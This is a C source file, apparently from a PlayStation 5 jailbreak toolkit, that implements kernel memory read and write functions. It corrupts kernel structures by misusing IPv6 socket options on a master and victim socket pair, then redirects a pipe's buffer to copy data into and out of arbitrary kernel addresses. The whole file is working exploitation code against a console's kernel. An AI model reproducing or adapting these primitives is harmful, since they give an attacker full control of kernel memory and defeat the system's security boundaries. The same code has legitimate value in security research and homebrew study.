#include <ps5/kernel.h>

#include <stdint.h>
#include <sys/socket.h>
#include <netinet/in.h>

uintptr_t kernel_base; // Offset: 0

// Store necessary sockets/pipe for corruption.
int _master_sock; // Offset: 8
int _victim_sock; // Offset: 12
int _rw_pipe[2];  // Offset: 16, 20
uint64_t _pipe_addr; // Offset: 24

// External functions for writing and reading data
extern size_t _write(int fd, const void *buf, size_t nbyte); // Offset: N/A
extern size_t _read(int fd, void *buf, size_t nbyte);       // Offset: N/A

// Arguments passed by way of entrypoint arguments.
// Initialize the necessary resources for read/write operations
void kernel_init_rw(int master_sock, int victim_sock, int *rw_pipe, uint64_t pipe_addr)
{
	_master_sock = master_sock;
	_victim_sock = victim_sock;
	_rw_pipe[0]  = rw_pipe[0];
	_rw_pipe[1]  = rw_pipe[1];
	_pipe_addr   = pipe_addr;
}

// Internal kwrite function - not friendly, only for setting up better primitives.
// Write data to a specified address using socket options
void kwrite(uint64_t addr, uint64_t *data) {
	uint64_t victim_buf[3];

	victim_buf[0] = addr;
	victim_buf[1] = 0;
	victim_buf[2] = 0;

	setsockopt(_master_sock, IPPROTO_IPV6, IPV6_PKTINFO, victim_buf, 0x14); // Offset: N/A
	setsockopt(_victim_sock, IPPROTO_IPV6, IPV6_PKTINFO, data, 0x14);       // Offset: N/A
}

// Public API function to write kernel data.
// Copy data from user space to kernel space
void kernel_copyin(void *src, uint64_t kdest, size_t length)
{
	uint64_t write_buf[3];

	// Set pipe flags
	write_buf[0] = 0;
	write_buf[1] = 0x4000000000000000;
	write_buf[2] = 0;
	kwrite(_pipe_addr, (uint64_t *) &write_buf); // Offset: N/A

	// Set pipe data address
	write_buf[0] = kdest;
	write_buf[1] = 0;
	write_buf[2] = 0;
	kwrite(_pipe_addr + 0x10, (uint64_t *) &write_buf); // Offset: N/A

	// Perform write across the pipe
	_write(_rw_pipe[1], src, length); // Offset: N/A
}

// Public API function to read kernel data.
// Copy data from kernel space to user space
void kernel_copyout(uint64_t ksrc, void *dest, size_t length)
{
	uint64_t write_buf[3];

	// Set pipe flags
	write_buf[0] = 0x4000000040000000;
	write_buf[1] = 0x4000000000000000;
	write_buf[2] = 0;
	kwrite(_pipe_addr, (uint64_t *) &write_buf); // Offset: N/A

	// Set pipe data address
	write_buf[0] = ksrc;
	write_buf[1] = 0;
	write_buf[2] = 0;
	kwrite(_pipe_addr + 0x10, (uint64_t *) &write_buf); // Offset: N/A

	// Perform read across the pipe
	_read(_rw_pipe[0], dest, length); // Offset: N/A
}
